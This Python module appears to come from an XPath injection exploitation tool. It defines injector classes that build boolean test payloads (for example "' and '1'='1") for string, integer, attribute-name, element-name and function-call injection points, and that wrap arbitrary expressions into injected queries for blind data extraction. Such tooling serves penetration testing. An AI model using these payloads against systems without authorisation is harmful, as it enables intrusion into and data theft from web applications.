import logbook

from ..xpath import E, L
from collections import namedtuple


# When injecting input into a vulnerable XPath query the injection point could be in several places (denoted by ?):
# 1. /lib/book[name='?']        : Inside a string (single or double quotes) inside a []
# 2. /lib/book[name=?]          : As an integer inside a []
# 3. /lib/book[name=func(?, ?)] : As an argument to a function
# 4. /lib/book[?=value]         : As the name of an attribute
# 5. /lib/?                     : As the whole name of an element
# 6. /lib/?postfix              : As the prefix of the name of an element
# 7. /lib/prefix?               : As the postfix of the name of an element

# There are no comment characters in XPath so we can't just cancel out any characters after the injection point
# like you can with SQL. Each of those cases above requires a different payload to be output to keep the query intact.
# Luckily the XPath syntax is very lenient.


def get_all_injectors():
    return {c.__name__.replace("Injector", ""): c
            for c in [IntegerInjection, ElementNameInjection, StringInjection,
                      AttributeNameInjection, FunctionCallInjection]}


Maybe = namedtuple("Maybe", "flag")


class Injection(object):
    """

    """

    example_text = None

    def __init__(self, detector):
        self.detector = detector
        self.working_value = self.detector.requests.param_value
        self.logger = logbook.Logger(self.__class__.__name__)
        self.kind = None

    def test(self):
        payloads = self.create_test_payloads()
        if isinstance(payloads, tuple):
            payloads = {None: payloads}

        for kind in payloads.keys():

            for payload, expected_result in payloads[kind]:
                payload = payload.format(working=self.working_value)
                self.logger.info("Testing payload {0}", payload)
                new_data = self.detector.requests.get_query_data(payload)

                if not (yield from self.detector.detect_url_stable(new_data, expected_result=expected_result)):
                    self.logger.info("Payload {0} is not stable", payload)
                    break
            else:
                self.logger.info("All payloads are stable, by Jove Watson I think I've got it.")
                self.kind = kind
                return True

        return False
    
    @property
    def example(self):
        return self.example_text if self.example_text is not None else self.get_example()

    def get_example(self):
        raise NotImplementedError()

    def get_payload(self, expression):
        raise NotImplementedError()

    def create_test_payloads(self):
        raise NotImplementedError()

    def name(self):
        return self.__class__.__name__.replace("Injection", "") + (" [{}]".format(self.kind) if self.kind else "")


class IntegerInjection(Injection):
    example_text = "/lib/book[name=?]"

    def create_test_payloads(self):
        return (
            ("{working} and 1=1", True),
            ("{working} and 1=2", False)
        )

    def get_payload(self, expression):
        return E(self.working_value) & expression


class StringInjection(Injection):
    def create_test_payloads(self):
        return {
            "'": [
                ("{working}' and '1'='1", True),
                ("{working}' and '1'='2", False)
            ],
            '"': [
                ('{working}" and "1"="1', True),
                ('{working}" and "1"="2', False)
            ]
        }

    def get_payload(self, expression):
        return E(self.working_value + self.kind) & expression & L("'1'='1".replace("'", self.kind))

    def get_example(self):
        return "/lib/book[name={}?{}".format(self.kind, self.kind)


class AttributeNameInjection(Injection):
    example_text = "/lib/book[?=value]"

    def create_test_payloads(self):
        return {
            "prefix": [
                ("1=1 and {working}", True),
                ("1=2 and {working}", False)
            ],
            "postfix": [
                ("{working} and not 1=2 and {working}", True),
                ("{working} and 1=2 and {working}", False)
            ]
        }

    def get_payload(self, expression):
        return expression & E(self.working_value)


class ElementNameInjection(Injection):
    example_text = "/lib/?/something"

    def create_test_payloads(self):
        return {
            "prefix": [
                (".[true()]/{working}", True),
                (".[false()]/{working}", False)
            ],
            "postfix": [
                ("{working}[true()]", True),
                ("{working}[false()]", False)
            ]
        }

    def get_payload(self, expression):
        if self.kind == "prefix":
            return E(".")[expression].add_path("/" + self.working_value)
        else:
            return E(self.working_value)[expression]

    def get_example(self):
        if self.kind == "prefix":
            return "/lib/?something"
        elif self.kind == "postfix":
            return "/lib/something?/"


class FunctionCallInjection(Injection):
    example_text = "/lib/something[function(?)]"

    def create_test_payloads(self):
        # ToDo: Make this work. Currently doesn't support anything likely to occur in the wild.
        return (
            ("{working}') and string('1'='1", True),
        )

    def get_payload(self, expression):
        return "%s') and %s and string('1'='1" % (self.working_value, expression)